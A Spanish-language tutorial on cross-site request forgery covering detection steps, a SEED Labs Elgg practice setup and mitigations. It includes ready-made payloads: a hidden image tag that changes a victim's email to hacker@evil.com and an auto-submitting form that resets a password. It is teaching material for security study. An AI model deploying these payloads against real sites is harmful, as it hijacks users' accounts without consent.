# 📤 Cross-Site Request Forgery (CSRF)

CSRF es un ataque que engaña al navegador de un usuario autenticado para que realice peticiones no deseadas a una aplicación web en su nombre. El servidor recibe la petición con las credenciales legítimas de la víctima (cookies de sesión) y la procesa como si fuera una acción voluntaria del usuario.

La clave: el servidor **no puede distinguir** una petición legítima de una fabricada por un atacante si la víctima está autenticada.

---

## ¿Cuándo es posible CSRF?

Para que CSRF sea explotable se necesitan tres condiciones:

1. La acción objetivo (cambio de contraseña, transferencia, etc.) se realiza con una petición predecible
2. La autenticación se basa solo en cookies de sesión (sin tokens adicionales)
3. El servidor no verifica el origen de la petición (cabecera `Referer` u `Origin`)

---

## Detección

### Paso 1: Capturar la petición legítima

Interceptar con Burp Suite o Caido la petición de la acción a explotar (ej. modificar perfil):

```http
POST /action/usersettings/save HTTP/1.1
Host: target.com
Cookie: session=f3ou2gcggud5hqrtup34bpjtob
Content-Type: multipart/form-data

name=Alice&email=alice@target.com&guid=56&__elgg_token=_wN6ApGARaOxIzDo1ybNrw&__elgg_ts=1744655518
```

### Paso 2: Comprobar si hay token CSRF

Si la petición incluye campos como `__elgg_token`, `csrf_token`, `_token`, etc., la aplicación tiene protección. Verificar si son validados realmente eliminándolos.

### Paso 3: Convertir a GET

Probar si la acción también funciona via GET (muchas aplicaciones lo aceptan). Cambiar el método y eliminar el token:

```
GET /action/usersettings/save?name=HACKED&email=hacker@evil.com&guid=56
```

Si el servidor aplica el cambio, confirma la vulnerabilidad.

---

## Explotación

### Mediante imagen invisible (GET)

El payload más simple: una imagen cuyo `src` es la petición maliciosa. Al cargar la página/email que la contiene, el navegador de la víctima envía la petición automáticamente con sus cookies.

```html
<img src="http://target.com/action/usersettings/save?name=HACKED&email=hacker@evil.com&guid=56"
     width="1" height="1" style="display:none" />
```

Útil cuando:
- La aplicación acepta peticiones GET para acciones que deberían ser POST
- El atacante puede embeber HTML en alguna función de la aplicación (mensajes, comentarios, etc.)

### Ejemplo — añadir amigo sin consentimiento

```html
<img src="http://target.com/action/friends/add?friend=57" width="1" height="1" />
```

### Mediante formulario (POST)

Para acciones que requieren POST, usar un formulario con autoenvío:

```html
<html>
<body onload="document.csrf_form.submit()">
  <form name="csrf_form" method="POST" action="http://target.com/action/password/change">
    <input type="hidden" name="new_password" value="hackeado123">
    <input type="hidden" name="confirm_password" value="hackeado123">
    <input type="hidden" name="guid" value="56">
  </form>
</body>
</html>
```

Alojar esta página y conseguir que la víctima la visite mientras está autenticada.

---

## Diferencia CSRF vs SSRF

| Aspecto | CSRF | SSRF |
|---|---|---|
| Quién realiza la petición | El navegador de la víctima | El servidor web |
| Requiere engañar a un usuario | Sí | No |
| Objetivo | Acciones en nombre del usuario | Acceso a recursos internos del servidor |

---

## Laboratorio para practicar

- **SEED Labs — CSRF con Elgg**: [https://seedsecuritylabs.org/Labs_20.04/Files/Web_CSRF_Elgg/Labsetup.zip](https://seedsecuritylabs.org/Labs_20.04/Files/Web_CSRF_Elgg/Labsetup.zip)

Añadir al `/etc/hosts`:
```
10.9.0.5    www.seed-server.com
10.9.0.5    www.example32.com
10.9.0.105  www.attacker32.com
```

Credenciales del lab: `alice:seedalice` / `samy:seedsamy`

---

## Mitigaciones

- **Token CSRF** por sesión y formulario, validado en servidor — la protección más efectiva
- Cabecera `SameSite=Strict` o `SameSite=Lax` en cookies de sesión (previene envío cross-site)
- Verificar cabecera `Origin` o `Referer` en el servidor
- Re-autenticación para acciones críticas (cambio de contraseña, transferencias)
- No aceptar peticiones GET para acciones con efectos secundarios
